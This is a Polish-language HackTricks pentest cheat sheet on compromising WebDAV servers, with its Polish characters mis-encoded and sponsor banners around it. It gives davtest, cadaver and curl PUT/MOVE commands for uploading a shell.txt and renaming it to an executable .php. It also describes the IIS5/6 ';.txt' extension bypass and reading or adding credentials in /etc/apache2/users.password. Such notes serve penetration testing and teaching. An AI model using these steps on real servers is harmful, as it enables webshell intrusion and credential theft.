# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** przy uÅ¼yciu **najbardziej zaawansowanych** narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Podczas pracy z **serwerem HTTP z wÅ‚Ä…czonym WebDav**, moÅ¼liwe jest **manipulowanie plikami**, jeÅ›li masz odpowiednie **poÅ›wiadczenia**, zwykle weryfikowane za pomocÄ… **HTTP Basic Authentication**. PrzejÄ™cie kontroli nad takim serwerem czÄ™sto wiÄ…Å¼e siÄ™ z **wgrywaniem i uruchamianiem webshell**.

DostÄ™p do serwera WebDav zazwyczaj wymaga **waÅ¼nych poÅ›wiadczeÅ„**, a [**bruteforce WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) jest powszechnÄ… metodÄ… ich pozyskania.

Aby przezwyciÄ™Å¼yÄ‡ ograniczenia dotyczÄ…ce wgrywania plikÃ³w, zwÅ‚aszcza te uniemoÅ¼liwiajÄ…ce wykonanie skryptÃ³w po stronie serwera, moÅ¼esz:

* **WgraÄ‡** pliki z **rozszerzeniami wykonywalnymi** bezpoÅ›rednio, jeÅ›li nie sÄ… ograniczone.
* **ZmieniÄ‡ nazwÄ™** wgranych plikÃ³w niebÄ™dÄ…cych wykonywalnymi (np. .txt) na rozszerzenie wykonywalne.
* **SkopiowaÄ‡** wgrane pliki niebÄ™dÄ…ce wykonywalnymi, zmieniajÄ…c ich rozszerzenie na takie, ktÃ³re jest wykonywalne.

## DavTest

**Davtest** prÃ³buje **wgraÄ‡ kilka plikÃ³w z rÃ³Å¼nymi rozszerzeniami** i **sprawdza**, czy rozszerzenie jest **wykonywane**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
## Cadaver

MoÅ¼esz uÅ¼yÄ‡ tego narzÄ™dzia do **poÅ‚Ä…czenia z serwerem WebDav** i wykonywania dziaÅ‚aÅ„ (takich jak **przesyÅ‚anie**, **przenoszenie** lub **usuwanie**) **rÄ™cznie**.
```
cadaver <IP>
```
## Zapytanie PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## Zapytanie MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do Å‚atwego tworzenia i **automatyzacji** procesÃ³w z wykorzystaniem najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## PodatnoÅ›Ä‡ na WebDav w IIS5/6

Ta podatnoÅ›Ä‡ jest bardzo interesujÄ…ca. **WebDav** **nie pozwala** na **przesyÅ‚anie** ani **zmianÄ™ nazwy** plikÃ³w z rozszerzeniem **.asp**. Jednak moÅ¼na to **obejÅ›Ä‡**, dodajÄ…c na koÅ„cu nazwy **";.txt"**, a plik zostanie **wykonany** jak plik .asp (moÅ¼na rÃ³wnieÅ¼ **uÅ¼yÄ‡ ".html" zamiast ".txt"**, ale **NIE zapomnij o ";"**).

NastÄ™pnie moÅ¼esz **przesÅ‚aÄ‡** swojÄ… powÅ‚okÄ™ jako plik ".**txt"** i **skopiowaÄ‡/przenieÅ›Ä‡ go do pliku ".asp;.txt"**. Po dostÄ™pie do tego pliku przez serwer WWW, zostanie **wykonany** (cadaver powie, Å¼e akcja przeniesienia nie powiodÅ‚a siÄ™, ale tak naprawdÄ™ siÄ™ udaÅ‚a).

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## Dane uwierzytelniajÄ…ce po

JeÅ›li Webdav korzystaÅ‚ z serwera Apache, powinieneÅ› sprawdziÄ‡ skonfigurowane witryny w Apache. Zazwyczaj:\
_**/etc/apache2/sites-enabled/000-default**_

WewnÄ…trz moÅ¼esz znaleÅºÄ‡ coÅ› w rodzaju:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Jak widaÄ‡, sÄ… pliki z waÅ¼nymi **dane uwierzytelniajÄ…ce** do serwera **webdav**:
```
/etc/apache2/users.password
```
WewnÄ…trz tego typu plikÃ³w znajdziesz **nazwÄ™ uÅ¼ytkownika** i **hash** hasÅ‚a. SÄ… to dane uwierzytelniajÄ…ce, ktÃ³rych serwer WebDAV uÅ¼ywa do uwierzytelniania uÅ¼ytkownikÃ³w.

MoÅ¼esz sprÃ³bowaÄ‡ je **zÅ‚amaÄ‡**, lub **dodaÄ‡ wiÄ™cej**, jeÅ›li z jakiegoÅ› powodu chcesz **uzyskaÄ‡ dostÄ™p** do serwera **WebDAV**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Aby sprawdziÄ‡, czy nowe dane uwierzytelniajÄ…ce dziaÅ‚ajÄ…, moÅ¼esz wykonaÄ‡:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## OdnoÅ›niki

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do Å‚atwego tworzenia i **automatyzacji prac** z wykorzystaniem najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ci.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
